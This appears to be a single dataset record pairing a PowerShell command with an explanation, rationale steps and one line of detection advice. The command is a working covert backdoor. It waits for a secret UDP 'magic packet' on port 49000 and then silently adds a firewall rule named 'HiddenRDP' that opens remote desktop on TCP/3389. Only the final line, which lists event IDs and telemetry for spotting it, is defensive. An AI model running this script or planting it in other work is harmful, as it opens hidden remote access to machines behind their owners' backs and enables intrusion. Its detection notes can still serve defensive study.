command: $port=49000;$magic='CA-FE-BA-BE-00-01';$u=New-Object System.Net.Sockets.UdpClient($port);$ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0);while($true){$buf=$u.Receive([ref]$ep);if([BitConverter]::ToString($buf) -eq $magic){& netsh advfirewall firewall add rule name='HiddenRDP' dir=in action=allow protocol=TCP localport=3389;break}}
explanation: Listens for a specific UDP magic packet (CA-FE-BA-BE-00-01) on port 49000. Upon receipt, it opens an inbound Windows Firewall rule for RDP (TCP/3389), enabling access only after the covert signal. Requires elevated PowerShell (UAC) because it modifies firewall rules via netsh.
rationale_steps: Open a UDP listener on a high port to await a secret magic packet.
When the exact magic bytes arrive, use netsh to add an inbound firewall rule opening TCP/3389.
Detection: monitor Security Event IDs 4946/4947 (firewall rule changes), Sysmon EID 1 for netsh.exe invocation, and unusual UDP packets to high ports with fixed payloads.
